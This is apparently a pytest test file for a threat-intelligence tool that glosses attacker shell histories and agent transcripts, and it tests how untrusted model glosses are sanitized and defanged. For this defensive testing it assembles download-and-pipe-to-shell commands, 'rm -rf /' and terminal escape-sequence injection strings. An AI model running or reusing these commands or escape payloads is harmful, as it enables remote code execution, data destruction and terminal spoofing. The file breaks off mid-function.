"""Regression tests for the hardened glossing stage: the gloss, pending and apply-glosses commands.

A glosses file comes from a model that has read attacker text, so it may be prompt-injected: every field is
untrusted. Rules gloss commands only; free text is sanitized and bounded; rejection reasons never echo raw input;
apply-glosses is model-only and annotate writes analyst glosses; context glosses keep their source; pending pages;
every CLI error has its exit code; revoked and deprecated techniques are handled; typed IOCs are always defanged.

Attack-like strings are built from fragments at runtime and never written to disk, so no literal command line sits in
this file.
"""

import json
import re
import sqlite3
import unicodedata

import pytest
import yaml

from conftest import FakeResolver

from interlinear_cti import cli
from interlinear_cti.errors import ResolverUnavailable
from interlinear_cti.glossing import apply_glosses, apply_rules, pending_lines
from interlinear_cti.model import Line, Source, Technique, Transcript, load, save
from interlinear_cti.normalize import normalize_text
from interlinear_cti.rules import load_library

AT = "2026-10-18T00:00:00Z"
MODEL = "claude-opus-5-5"
ESC = chr(0x1B)
BEL = chr(0x07)
NUL = chr(0x00)
CR = chr(0x0D)
LF = chr(0x0A)
BS = chr(0x5C)
RLO = chr(0x202E)
ST = ESC + BS  # ESC backslash ends an OSC sequence
OSC8 = ESC + "]8;;http://198.51.100.7/" + ST + "click" + ESC + "]8;;" + ST  # a terminal hyperlink
E = BS + "x1b"  # how a reason writes ESC
# Fragments, joined only at runtime.
CURL = "cu" + "rl"
WGET = "wg" + "et"
TO_BASH = "| ba" + "sh"
TO_SH = "| s" + "h"
# What a terminal or a bidi-aware viewer acts on: C0, DEL, C1, the bidi controls, and the Unicode line separators.
UNSAFE = re.compile("[" + chr(0) + "-" + chr(0x1F) + chr(0x7F) + "-" + chr(0x9F) + chr(0x061C) + chr(0x200E)
                    + chr(0x200F) + chr(0x202A) + "-" + chr(0x202E) + chr(0x2066) + "-" + chr(0x2069) + chr(0x2028)
                    + chr(0x2029) + "]")


def picture(code: int) -> str:
    """The control picture parse stores for a C0 control."""
    return chr(0x2400 + code)


def shown(code: int) -> str:
    """How a bidi control or a C1 control is stored: U+27E8, U+NNNN, U+27E9."""
    return f"{chr(0x27E8)}U+{code:04X}{chr(0x27E9)}"


def entry(**overrides):
    base = {"n": 1, "meaning": "Runs an unknown tool across all targets.", "techniques": ["T1059.004"],
            "confidence": "low"}
    base.update(overrides)
    return base


def history(parse_text, count=1):
    return parse_text(".bash_history", "".join(f"frob{i} --all\n" for i in range(1, count + 1)))


def apply(transcript, entries, source="model", by=MODEL, resolver=None, warnings=None):
    return apply_glosses(transcript, entries, source=source, by=by, resolver=resolver or FakeResolver(), at=AT,
                         warnings=warnings)


def transcript_of(*files):
    """A transcript of (source kind, [(actor, raw text), ...]) files, each text normalized as parse stores it.

    Built in memory, so attack-like text never reaches the disk.
    """
    sources, lines = [], []
    for sid, (kind, rows) in enumerate(files):
        sources.append(Source(id=sid, name=f"file{sid}", sha256="0" * 64, size=1, kind=kind, parsed_at=AT))
        for actor, text in rows:
            lines.append(Line(n=len(lines) + 1, source=sid, line=len(lines) + 1, actor=actor,
                              text=normalize_text(text)))
    return Transcript(interlinear_version="0.1.0", sources=sources, lines=lines)


@pytest.fixture
def library(resolver):
    return load_library(resolver=resolver)


@pytest.fixture
def cli_paths(tmp_path, monkeypatch, resolver):
    """A parsed two-line transcript (whoami, then an unknown tool) and a glosses file path, with the fake resolver."""
    monkeypatch.setattr("interlinear_cti.verify.CountermapResolver", lambda db=None: resolver)
    hist = tmp_path / ".bash_history"
    hist.write_bytes(b"whoami\nfrobnicate --all\n")
    path = tmp_path / "transcript.json"
    assert cli.main(["parse", str(hist), "-o", str(path)]) == 0
    return path, tmp_path / "glosses.json"


def write_glosses(path, entries):
    path.write_text(json.dumps(entries), encoding="utf-8")


# 1. Rules gloss commands only


RULE_ELIGIBLE = [("bash_history", "operator"), ("zsh_history", "operator"), ("powershell_history", "operator"),
                 ("script", "operator"), ("agent_jsonl", "agent_tool"), ("pentagi", "agent_tool"),
                 ("unknown", "unknown")]
RULE_SKIPPED = [("agent_jsonl", "agent_reasoning"), ("pentagi", "agent_reasoning"), ("agent_jsonl", "operator"),
                ("pentagi", "operator"), ("agent_jsonl", "unknown"), ("pentagi", "unknown"),
                ("agent_jsonl", "tool_output")]


@pytest.mark.parametrize("kind, actor", RULE_ELIGIBLE)
def test_rules_gloss_command_lines(library, kind, actor):
    transcript = transcript_of((kind, [(actor, "whoami")]))
    assert apply_rules(transcript, library, at=AT) == {"rule": 1}
    assert transcript.lines[0].gloss.rule_id == "whoami-id"


@pytest.mark.parametrize("kind, actor", RULE_SKIPPED)
def test_rules_leave_prose_and_output_pending(library, kind, actor):
    transcript = transcript_of((kind, [(actor, "whoami")]))
    apply_rules(transcript, library, at=AT)
    assert transcript.lines[0].gloss.source == "pending"


def test_rules_leave_agent_reasoning_and_chat_pending(library):
    # Words in prose must not match the brute-force, cron and download rules.
    reasoning = ["I will not crack these hashes with hashcat; that is outside the boundary I was given.",
                 "The crontab looked clean, so no persistence there.",
                 f"Next I will run whoami and then {CURL} http://203.0.113.5/x.sh {TO_BASH} to stage it.",
                 "I should not run " + "rm -r" + "f / or history -c here."]
    chat = ["ask john for the vpn creds",
            f"dont bother with {WGET} http://203.0.113.5/a {TO_SH}, just check crontab -l"]
    transcript = transcript_of(("agent_jsonl", [("agent_reasoning", text) for text in reasoning]
                                + [("operator", text) for text in chat] + [("agent_tool", "whoami")]),
                               ("bash_history", [("operator", "cd /home/john"), ("operator", "ls -la /home/john")]))
    apply_rules(transcript, library, at=AT)
    sources = [line.gloss.source for line in transcript.lines]
    assert sources[:6] == ["pending"] * 6
    assert transcript.lines[6].gloss.rule_id == "whoami-id"
    assert "pending" not in sources[7:]  # shell commands still get rules


UNKNOWN_FORMAT_NOTE = "source format unknown; rule applied to unclassified text"


def test_rules_on_unknown_format_sources_are_at_most_medium_confidence(library):
    # A file parse could not classify may not be a shell history at all, so a rule match there is less certain.
    transcript = transcript_of(("unknown", [("unknown", "whoami"), ("unknown", "cd /tmp"), ("unknown", "ssh host"),
                                            ("unknown", "su -")]),
                               ("bash_history", [("operator", "whoami")]))
    apply_rules(transcript, library, at=AT)
    glosses = [(line.gloss.rule_id, line.gloss.source, line.gloss.confidence, line.gloss.note)
               for line in transcript.lines]
    assert glosses == [("whoami-id", "rule", "medium", UNKNOWN_FORMAT_NOTE),  # capped from high
                       ("navigation", "none", "medium", UNKNOWN_FORMAT_NOTE),  # context rules too
                       ("ssh-remote", "rule", "medium", UNKNOWN_FORMAT_NOTE),  # already medium
                       ("switch-user", "rule", "low", UNKNOWN_FORMAT_NOTE),  # never raised
                       ("whoami-id", "rule", "high", None)]  # a known format keeps the rule's confidence


# 2. Free text is sanitized and bounded


def test_free_text_and_by_are_defanged(parse_text):
    # Live indicators in meaning, note and artifacts, and a --by that names a domain, are stored defanged.
    transcript = history(parse_text)
    glosses = [entry(meaning="Downloads from http://203.0.113.5/x.sh and https://evil.example.com/a",
                     note="C2 at 198.51.100.7:4444, see evil.example.ru",
                     artifacts=["http://evil.example.com/payload"])]
    assert apply(transcript, glosses, by="analyst@evil.example.com") == (1, [])
    gloss = transcript.lines[0].gloss
    assert gloss.meaning == "Downloads from hxxp://203.0.113[.]5/x.sh and hxxps://evil.example[.]com/a"
    assert gloss.note == "C2 at 198.51.100[.]7:4444, see evil.example[.]ru"
    assert gloss.artifacts == ["hxxp://evil.example[.]com/payload"]
    assert gloss.by == "analyst@evil.example[.]com"


def test_controls_bidi_and_line_breaks_are_neutralized(parse_text):
    # OSC 0 (window title), erase screen, NUL, CR, U+202E, an OSC 8 hyperlink, and line breaks.
    transcript = history(parse_text)
    note = ESC + "]0;pwned" + BEL + ESC + "[2J" + NUL + CR + RLO + "gnp.exe " + OSC8
    meaning = "Benign." + LF + "   2  next" + chr(0x2028) + "x" + chr(0x2029) + "y" + CR + LF + "z"
    glosses = [entry(meaning=meaning, note=note, artifacts=["a" + chr(0x85) + "b"])]
    assert apply(transcript, glosses) == (1, [])
    gloss = transcript.lines[0].gloss
    for text in (gloss.meaning, gloss.note, *gloss.artifacts):
        assert not UNSAFE.search(text), ascii(text)
    assert gloss.note == (picture(0x1B) + "]0;pwned" + picture(0x07) + picture(0x1B) + "[2J" + picture(0x00)
                          + picture(0x0D) + shown(0x202E) + "gnp.exe " + picture(0x1B) + "]8;;hxxp://198.51.100[.]7/"
                          + picture(0x1B) + BS + "click" + picture(0x1B) + "]8;;" + picture(0x1B) + BS)
    # Changed by the re-check: U+2028 and U+2029 are shown like other format characters, not turned into spaces.
    assert gloss.meaning == "Benign.    2  next" + shown(0x2028) + "x" + shown(0x2029) + "y" + picture(0x0D) + " z"
    assert gloss.artifacts == ["a" + shown(0x85) + "b"]


# Invisible format characters (Unicode category Cf): zero-width space, BOM, word joiner, soft hyphen, bidi controls
# and the tag characters (U+E0000 to U+E007F), which can carry hidden instructions. Plus the line separators.
FORMAT_CHARS = [0x200B, 0x200D, 0xFEFF, 0x2060, 0x00AD, 0x061C, 0x202E, 0x2066, 0x2028, 0x2029, 0xE0001, 0xE0041,
                0xE007F]


def test_invisible_format_characters_are_shown(parse_text):
    transcript = history(parse_text)
    hidden = "".join(chr(code) for code in FORMAT_CHARS)
    glosses = [entry(meaning="a" + hidden + "b", note="n" + hidden, artifacts=["x" + chr(0xE0049) + "y"])]
    assert apply(transcript, glosses) == (1, [])
    gloss = transcript.lines[0].gloss
    visible = "".join(shown(code) for code in FORMAT_CHARS)
    assert gloss.meaning == "a" + visible + "b"
    assert gloss.note == "n" + visible
    assert gloss.artifacts == ["x" + chr(0x27E8) + "U+E0049" + chr(0x27E9) + "y"]  # five hex digits
    for text in (gloss.meaning, gloss.note, *gloss.artifacts):
        assert not any(unicodedata.category(ch) == "Cf" for ch in text)


def test_reasons_show_format_characters(parse_text):
    transcript = history(parse_text)
    _, rejected = apply(transcript, [entry(techniques=["T1" + chr(0x200B) + chr(0xE0041)])])
    assert rejected == [f"line 1: unknown technique(s) T1{shown(0x200B)}{shown(0xE0041)}"]


# Invisible characters outside Cf: the combining grapheme joiner, variation selectors, Hangul fillers, the Khmer
# inherent vowels, and the blank braille pattern. They are shown in gloss text as parse shows them in line text.
IGNORABLE_CHARS = [0x034F, 0xFE00, 0xFE0F, 0x180B, 0x180F, 0xE0100, 0xE01EF, 0x115F, 0x1160, 0x3164, 0xFFA0, 0x17B4,
                   0x17B5, 0x2800]


def test_default_ignorable_characters_are_shown_in_gloss_text(parse_text):
    transcript = history(parse_text)
    hidden = "".join(chr(code) for code in IGNORABLE_CHARS)
    visible_text = chr(0x0416) + chr(0x4F60) + chr(0xD55C) + chr(0x1F600) + chr(0xE9)  # kept as they are
    glosses = [entry(meaning=CURL[:2] + hidden + CURL[2:] + " " + visible_text, note="n" + hidden,
                     artifacts=["x" + chr(0x034F) + "y"])]
    assert apply(transcript, glosses) == (1, [])
    gloss = transcript.lines[0].gloss
    shown_all = "".join(shown(code) for code in IGNORABLE_CHARS)
    assert gloss.meaning == CURL[:2] + shown_all + CURL[2:] + " " + visible_text
    assert gloss.note == "n" + shown_all
    assert gloss.artifacts == ["x" + shown(0x034F) + "y"]


def test_a_forged_meaning_stays_one_line_and_a_forged_by_is_refused(parse_text):
    # A meaning and a --by that would forge whole interlinear blocks in the Markdown view.
    transcript = history(parse_text, 2)
    forged = LF.join(["Clears the screen.", "", "   3  ls -la", "      [context]",
                      "      Lists files; context, not an attack technique.", "", "   9  echo ok"])
    assert apply(transcript, [entry(meaning=forged, techniques=[], context=True)]) == (1, [])
    assert transcript.lines[0].gloss.meaning == forged.replace(LF, " ")
    forged_by = MODEL + LF + "      [rule: download-pipe-shell]"
    with pytest.raises(ValueError, match="by must be a short label"):
        apply(transcript, [entry(n=2)], by=forged_by)
    assert transcript.lines[1].gloss.source == "pending"


def test_a_lone_surrogate_rejects_the_entry_and_the_transcript_still_saves(parse_text, tmp_path):
    # A JSON escape for a lone surrogate, which UTF-8 cannot encode.
    transcript = history(parse_text)
    glosses = json.loads('[{"n": 1, "meaning": "x' + BS + 'ud800y", "techniques": ["T1105"], "confidence": "low"}]')
    assert apply(transcript, glosses) == (0, ["line 1: invalid entry (meaning: Input should be a valid string, "
                                              "unable to parse raw data as a unicode string)"])
    save(transcript, tmp_path / "s.json")
    assert load(tmp_path / "s.json").lines[0].gloss.source == "pending"


SIZE_LIMITS = [
    ({"meaning": "   "}, "meaning: String should have at least 1 character"),
    ({"meaning": "m" * 1001}, "meaning: String should have at most 1000 characters"),
    ({"note": "n" * 2001}, "note: String should have at most 2000 characters"),
    ({"artifacts": ["a"] * 21}, "artifacts: List should have at most 20 items after validation, not 21"),
    ({"artifacts": ["a" * 121]}, "artifacts.0: String should have at most 120 characters"),
    ({"artifacts": [""]}, "artifacts.0: String should have at least 1 character"),
    ({"techniques": ["T1105"] * 11}, "techniques: List should have at most 10 items after validation, not 11"),
    ({"iocs": [{"type": "ipv4", "value": "192.0.2.1"}] * 51},
     "iocs: List should have at most 50 items after validation, not 51"),
    ({"iocs": [{"type": "url", "value": "u" * 2001}]}, "iocs.0.value: String should have at most 2000 characters"),
]


@pytest.mark.parametrize("overrides, reason", SIZE_LIMITS)
def test_values_over_a_limit_reject_the_entry(parse_text, overrides, reason):
    transcript = history(parse_text)
    assert apply(transcript, [entry(**overrides)]) == (0, [f"line 1: invalid entry ({reason})"])
    assert transcript.lines[0].gloss.source == "pending"


def test_values_at_the_limits_are_accepted(parse_text):
    transcript = history(parse_text)
    meaning = ("abcd " * 200)[:999] + "e"  # 1,000 characters in short words, so not hashed as a blob
    glosses = [entry(meaning="  " + meaning + "  ", note="n" * 2000, artifacts=["a" * 120] * 20,
                     techniques=["T1105"] * 10, iocs=[{"type": "ipv4", "value": "192.0.2.1"}] * 50)]
    assert apply(transcript, glosses) == (1, [])
    assert transcript.lines[0].gloss.meaning == meaning  # stripped


def test_a_50_mb_meaning_is_rejected(parse_text):
    transcript = history(parse_text)
    _, rejected = apply(transcript, [entry(meaning="A" * 50_000_000)])
    assert rejected == ["line 1: invalid entry (meaning: String should have at most 1000 characters)"]


def test_a_million_artifacts_are_rejected(parse_text):
    transcript = history(parse_text)
    _, rejected = apply(transcript, [entry(artifacts=["x"] * 1_000_000)])
    assert rejected == ["line 1: invalid entry (artifacts: List should have at most 20 items after validation, "
                        "not 1000000)"]


MUNOZ = "Mu" + chr(0xF1) + "oz"
GOOD_BY = ["claude-opus-5-5", "Diego Parra", "m", "a" * 64, "gpt-4.1@lab:v2_x", MUNOZ,
           "Jos" + chr(0xE9) + " " + MUNOZ, chr(0xD1) + "o", chr(0xF1) * 64]
BAD_BY = ["", " Diego", "-x", "a" * 65, MODEL + LF + "      [rule: download-pipe-shell]", "Diego/evil",
          "x" + ESC + "[2J", "Diego" + RLO, "x" + CR, "_x", MUNOZ + chr(0x200B), chr(0xF1) * 65]


@pytest.mark.parametrize("by", GOOD_BY)
def test_by_accepts_short_labels(parse_text, by):
    transcript = history(parse_text)
    assert apply(transcript, [entry()], by=by) == (1, [])
    assert transcript.lines[0].gloss.by == by


@pytest.mark.parametrize("by", BAD_BY)
def test_by_refuses_anything_else(parse_text, by):
    transcript = history(parse_text)
    with pytest.raises(ValueError, match="by must be a short label"):
        apply(transcript, [entry()], by=by)


@pytest.mark.parametrize("command", ["apply-glosses", "annotate"])
@pytest.mark.parametrize("by", BAD_BY)
def test_cli_by_must_be_a_short_label(cli_paths, capsys, command, by):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])
    with pytest.raises(SystemExit) as exc:
        cli.main([command, str(path), str(glosses), "--by", by])
    assert exc.value.code == 2
    err = capsys.readouterr().err
    assert "--by" in err and ESC not in err and RLO not in err
    assert load(path).lines[1].gloss.source == "pending"


# 3. Rejection messages never echo raw input


def test_rejection_reasons_never_echo_raw_input(parse_text):
    # Escape sequences in n and in an extra key, and a 2 MB label.
    transcript = history(parse_text, 2)
    glosses = [{"n": ESC + "]0;PWNED" + BEL + ESC + "[31mred http://198.51.100.7/", "meaning": 1},
               {**entry(n=2), ESC + "[2J" + OSC8 + RLO: 1},
               {"n": "A" * 2_000_000, "meaning": 1}]
    applied, rejected = apply(transcript, glosses)
    assert applied == 0
    assert rejected == [
        "line ?: invalid entry (n: Input should be a valid integer)",
        f"line 2: invalid entry ({E}[2J{E}]8;;hxxp://198.51.100[.]7/{E}{BS}click{E}]8;;{E}{BS}{shown(0x202E)}: "
        "Extra inputs are not permitted)",
        "line ?: invalid entry (n: Input should be a valid integer)",
    ]


def test_reasons_are_capped_at_300_characters(parse_text):
    transcript = history(parse_text)
    long_key = "word " * 200 + "http://198.51.100.7/"  # words, so not hashed as a blob
    _, rejected = apply(transcript, [{**entry(), long_key: 1}])
    assert len(rejected[0]) == 300 and rejected[0].startswith("line 1: invalid entry (word word ")
    assert rejected[0].endswith("...")


def test_long_unknown_techniques_are_never_echoed(parse_text):
    # A technique wrapped in an OSC 8 hyperlink, and a 100,000-character one.
    transcript = history(parse_text)
    wrapped = ESC + "]8;;http://198.51.100.7/" + ST + "T1105" + ESC + "]8;;" + ST
    _, rejected = apply(transcript, [entry(techniques=[wrapped, "Z" * 100_000, ESC + "[2JT1", "", "T9999"])])
    assert rejected == [f"line 1: unknown technique(s) (an ID of {len(wrapped)} characters), "
                        f"(an ID of 100000 characters), {E}[2JT1, (empty), T9999"]


@pytest.mark.parametrize("n", [True, False, "2", "1", 3.0, None, [1], {"n": 1}])
def test_n_is_echoed_only_when_an_int(parse_text, n):
    transcript = history(parse_text)
    _, rejected = apply(transcript, [entry(n=n)])
    assert rejected == ["line ?: invalid entry (n: Input should be a valid integer)"]


def test_entries_that_are_not_objects_are_rejected(parse_text):
    transcript = history(parse_text)
    _, rejected = apply(transcript, ["x", [1], None])
    assert rejected == ["line ?: invalid entry (Input should be a valid dictionary or instance of GlossInput)"] * 3


def test_an_enormous_n_is_not_echoed(parse_text):
    transcript = history(parse_text)
    assert apply(transcript, [entry(n=10**5000)]) == (0, ["line ?: no such line"])
    assert apply(transcript, [entry(n=-3)]) == (0, ["line -3: no such line"])


# 4. Analyst glosses need their own command


def test_apply_glosses_takes_no_source_option(cli_paths):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])
    for source in ("analyst", "model"):
        with pytest.raises(SystemExit) as exc:
            cli.main(["apply-glosses", str(path), str(glosses), "--by", "Diego", "--source", source])
        assert exc.value.code == 2
    assert load(path).lines[1].gloss.source == "pending"


def test_annotate_replaces_a_rule_gloss_that_apply_glosses_cannot(cli_paths, capsys):
    path, glosses = cli_paths
    assert cli.main(["gloss", str(path)]) == 0
    write_glosses(glosses, [entry(n=1, meaning="Checks which account the shell runs as.", techniques=["T1033"],
                                  confidence="high")])
    capsys.readouterr()
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 1
    assert "line 1: already glossed (rule); model glosses only fill pending lines" in capsys.readouterr().err
    assert cli.main(["annotate", str(path), str(glosses), "--by", "Diego"]) == 0
    assert capsys.readouterr().out.startswith("Applied 1 analyst gloss to ")
    line = load(path).lines[0]
    assert (line.gloss.source, line.gloss.by) == ("analyst", "Diego")
    assert [g.source for g in line.history] == ["rule"]


def test_apply_glosses_labels_its_glosses_model(cli_paths, capsys):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 0
    assert capsys.readouterr().out.startswith("Applied 1 model gloss to ")
    assert (load(path).lines[1].gloss.source, load(path).lines[1].gloss.by) == ("model", MODEL)


# 5. Context glosses keep their source


def test_context_glosses_keep_their_source(parse_text, library):
    transcript = parse_text(".bash_history", "frob a\nfrob b\ncd /tmp\n")
    apply_rules(transcript, library, at=AT)
    context = {"meaning": "Clears a local cache; context.", "context": True, "confidence": "high"}
    assert apply(transcript, [{"n": 1, **context}]) == (1, [])
    assert apply(transcript, [{"n": 2, **context}], source="analyst", by="Diego") == (1, [])
    model, analyst, rule = (line.gloss for line in transcript.lines)
    assert (model.source, model.by, model.techniques) == ("model", MODEL, [])
    assert (analyst.source, analyst.by, analyst.techniques) == ("analyst", "Diego", [])
    assert (rule.source, rule.rule_id, rule.by) == ("none", "navigation", f"rules {library.version}")


# 6. pending pages


def test_pending_pages_with_after(parse_text):
    # 120 pending lines, and a model that leaves the whole first batch pending.
    transcript = history(parse_text, 120)
    first = pending_lines(transcript)
    assert [row["n"] for row in first] == list(range(1, 51))
    assert pending_lines(transcript) == first  # without --after, the same batch again
    assert [row["n"] for row in pending_lines(transcript, after=50)] == list(range(51, 101))
    assert [row["n"] for row in pending_lines(transcript, after=100)] == list(range(101, 121))
    assert pending_lines(transcript, after=120) == []


def test_pending_limit_must_be_at_least_one(parse_text):
    transcript = history(parse_text)
    for limit in (0, -1):
        with pytest.raises(ValueError, match="at least 1"):
            pending_lines(transcript, limit=limit)


def test_cli_pending_pages(tmp_path, capsys):
    hist = tmp_path / ".bash_history"
    hist.write_bytes(b"frobnicate --all\n" + b"".join(b"blob%d --x\n" % i for i in range(120)))
    path = tmp_path / "transcript.json"
    assert cli.main(["parse", str(hist), "-o", str(path)]) == 0
    capsys.readouterr()
    assert cli.main(["pending", str(path), "--after", "50", "--limit", "5"]) == 0
    assert [row["n"] for row in json.loads(capsys.readouterr().out)] == [51, 52, 53, 54, 55]
    assert cli.main(["pending", str(path), "--after", "121"]) == 0
    assert json.loads(capsys.readouterr().out) == []
    for limit in ("0", "-1", "x"):
        with pytest.raises(SystemExit) as exc:
            cli.main(["pending", str(path), "--limit", limit])
        assert exc.value.code == 2
        assert "--limit" in capsys.readouterr().err


# 7. Exit codes across the CLI


def test_deeply_nested_glosses_are_invalid_input(cli_paths, capsys):
    # 100,000 levels of nesting.
    path, glosses = cli_paths
    glosses.write_text("[" * 100_000 + "]" * 100_000, encoding="utf-8")
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 2
    err = capsys.readouterr().err
    assert err.startswith("error: ") and "nested too deeply" in err and "Traceback" not in err


@pytest.mark.parametrize("content", ['{"n": 1}', "not json", "[1,", ""])
def test_glosses_that_are_not_a_json_list_are_invalid_input(cli_paths, capsys, content):
    path, glosses = cli_paths
    glosses.write_text(content, encoding="utf-8")
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 2
    assert capsys.readouterr().err.startswith("error: ")


def test_missing_inputs_are_invalid_input(cli_paths, capsys):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])
    missing = path.parent / "missing.json"
    for argv in (["apply-glosses", str(path), str(missing), "--by", MODEL],
                 ["annotate", str(missing), str(glosses), "--by", "Diego"],
                 ["pending", str(missing)], ["gloss", str(missing)]):
        assert cli.main(argv) == 2
        assert capsys.readouterr().err.startswith("error: ")


def test_a_transcript_that_is_not_one_is_invalid_input(cli_paths, capsys):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])
    path.write_text("{}", encoding="utf-8")
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 2
    assert "not an Interlinear transcript" in capsys.readouterr().err


def test_error_messages_are_defanged_and_escaped(cli_paths, monkeypatch, capsys):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])

    def unavailable(db=None):
        raise ResolverUnavailable("Countermap is missing " + OSC8)

    monkeypatch.setattr("interlinear_cti.verify.CountermapResolver", unavailable)
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 2
    err = capsys.readouterr().err
    assert err.startswith("error: Countermap is missing ") and "hxxp://198.51.100[.]7/" in err
    assert not UNSAFE.search(err.rstrip(LF))


def test_write_errors_are_exit_3(cli_paths, monkeypatch, capsys):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])

    def full_disk(*args, **kwargs):
        raise PermissionError(13, "denied " + OSC8)

    monkeypatch.setattr("interlinear_cti.model.save", full_disk)
    for argv in (["gloss", str(path)], ["apply-glosses", str(path), str(glosses), "--by", MODEL],
                 ["annotate", str(path), str(glosses), "--by", "Diego"]):
        assert cli.main(argv) == 3
        assert capsys.readouterr().err == "error: cannot write output (PermissionError)\n"


@pytest.mark.parametrize("error", [sqlite3.OperationalError("disk I/O error " + OSC8), yaml.YAMLError(OSC8),
                                   RuntimeError(OSC8), KeyError(OSC8), RecursionError(OSC8)])
def test_unexpected_errors_are_internal_and_quiet(cli_paths, monkeypatch, capsys, error):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2)])

    class Broken(FakeResolver):
        def check(self, technique_id):
            raise error

    monkeypatch.setattr("interlinear_cti.verify.CountermapResolver", lambda db=None: Broken())
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 3
    assert capsys.readouterr().err == f"error: internal {type(error).__name__}\n"


def test_a_broken_rule_library_is_an_internal_error(cli_paths, monkeypatch, capsys):
    path, _ = cli_paths

    def broken(*args, **kwargs):
        raise yaml.YAMLError("bad rule " + OSC8)

    monkeypatch.setattr("interlinear_cti.rules.load_library", broken)
    assert cli.main(["gloss", str(path)]) == 3
    assert capsys.readouterr().err == "error: internal YAMLError\n"


# 8. Techniques


class RevokedWithoutReplacement(FakeResolver):
    def check(self, technique_id):
        if isinstance(technique_id, str) and technique_id.strip().upper() == "T1454":
            return Technique(id="T1454", status="revoked")
        return super().check(technique_id)


def test_model_glosses_reject_revoked_techniques(parse_text):
    transcript = history(parse_text, 2)
    _, rejected = apply(transcript, [entry(techniques=["T1105", "t1562.003"])])
    assert rejected == ["line 1: T1562.003 is revoked; use T1690"]
    _, rejected = apply(transcript, [entry(n=2, techniques=["T1454"])], resolver=RevokedWithoutReplacement())
    assert rejected == ["line 2: T1454 is revoked"]
    assert [line.gloss.source for line in transcript.lines] == ["pending", "pending"]


def test_analyst_glosses_accept_revoked_techniques_with_a_warning(parse_text):
    transcript = history(parse_text)
    warnings: list[str] = []
    glosses = [entry(techniques=["T1562.003"])]
    assert apply(transcript, glosses, source="analyst", by="Diego", warnings=warnings) == (1, [])
    assert warnings == ["line 1: T1562.003 is revoked; use T1690 (accepted for an analyst gloss)"]
    technique = transcript.lines[0].gloss.techniques[0]
    assert (technique.id, technique.status, technique.replaced_by) == ("T1562.003", "revoked", ["T1690"])


@pytest.mark.parametrize("source, by", [("model", MODEL), ("analyst", "Diego")])
def test_deprecated_techniques_are_accepted_with_a_warning(parse_text, source, by):
    transcript = history(parse_text)
    warnings: list[str] = []
    assert apply(transcript, [entry(techniques=["T1053.004"])], source=source, by=by, warnings=warnings) == (1, [])
    assert warnings == ["line 1: T1053.004 is deprecated (accepted)"]
    assert transcript.lines[0].gloss.techniques[0].status == "deprecated"


def test_rejected_entries_add_no_warnings(parse_text):
    transcript = history(parse_text)
    warnings: list[str] = []
    _, rejected = apply(transcript, [entry(techniques=["T1053.004", "T9999"])], warnings=warnings)
    assert rejected == ["line 1: unknown technique(s) T9999"] and warnings == []


def test_techniques_are_deduplicated_after_canonicalizing(parse_text):
    transcript = history(parse_text)
    assert apply(transcript, [entry(techniques=["T1105", "t1105", " T1105 ", "T1059.004", "T1105"])]) == (1, [])
    assert [t.id for t in transcript.lines[0].gloss.techniques] == ["T1105", "T1059.004"]


def test_cli_warnings_count_toward_exit_1(cli_paths, capsys):
    path, glosses = cli_paths
    write_glosses(glosses, [entry(n=2, techniques=["T1053.004"])])
    assert cli.main(["apply-glosses", str(path), str(glosses), "--by", MODEL]) == 1
    out, err = capsys.readouterr()
    assert out.startswith("Applied 1 model gloss to ") and out.rstrip().endswith("; rejected 0; 1 warning")
    assert err == "  warning: line 2: T1053.004 is deprecated (accepted)\n"
    assert load(path).lines[1].gloss.source == "model"


@pytest.mark.countermap
def test_revoked_and_deprecated_against_the_real_database(parse_text):
    pytest.importorskip("countermap")
    from countermap.sources import default_db_path

    if not default_db_path().exists():
        pytest.skip("no Countermap database; run `countermap build`")
    from interlinear_cti.verify import CountermapResolver

    real = CountermapResolver()
    transcript = history(parse_text, 3)
    _, rejected = apply(transcript, [entry(n=1, techniques=["T1562.003"]), entry(n=2, techniques=["T1454"])],
                        resolver=real)
    assert rejected == ["line 1: T1562.003 is revoked; use T1690", "line 2: T1454 is revoked"]
    warnings: list[str] = []
    assert apply(transcript, [entry(n=3, techniques=["T1053.004"])], resolver=real, warnings=warnings) == (1, [])
    assert warnings == ["line 3: T1053.004 is deprecated (accepted)"]


# 9. Typed IOC values are always defanged


IOC_VALUES = [
    ("domain", "evil.example.zip", "evil.example[.]zip"),
    ("domain", "evil.example.mov", "evil.example[.]mov"),
    ("domain", "login.microsoft.com.evil.zip", "login.microsoft.com.evil[.]zip"),
    ("domain", "evil.xn--p1ai", "evil[.]xn--p1ai"),
    ("domain", "update.sh", "update[.]sh"),
    ("domain", "evil.example.zip.", "evil.example[.]zip."),
    ("domain", "evil.example.com", "evil.example[.]com"),
    ("domain", "localhost", "localhost"),
    ("url", "hxxp://evil.example.zip/a", "hxxp://evil.example[.]zip/a"),
    ("url", "http://evil.example.zip/a", "hxxp://evil.example[.]zip/a"),
    ("url", "evil.example.zip/a", "evil.example[.]zip/a"),
    ("url", "evil.example.zip:8080/a", "evil.example[.]zip:8080/a"),
    ("url", "//evil.example.zip/a", "//evil.example[.]zip/a"),
    ("url", "ftp://user@evil.example.app/a", "ftp://user@evil.example[.]app/a"),
    ("url", "evil.example.zip/x?u=http://198.51.100.7/", "evil.example[.]zip/x?u=hxxp://198.51.100[.]7/"),
    ("url", "http://[2001:db8::1]/a", "hxxp://[2001[:]db8[:][:]1]/a"),
    ("path", "/tmp/update.zip", "/tmp/update.zip"),
    ("hash", "d41d8cd98f00b204e9800998ecf8427e", "d41d8cd98f00b204e9800998ecf8427e"),
]


@pytest.mark.parametrize("ioc_type, value, stored", IOC_VALUES)
def test_typed_iocs_are_always_defanged(parse_text, ioc_type, value, stored):
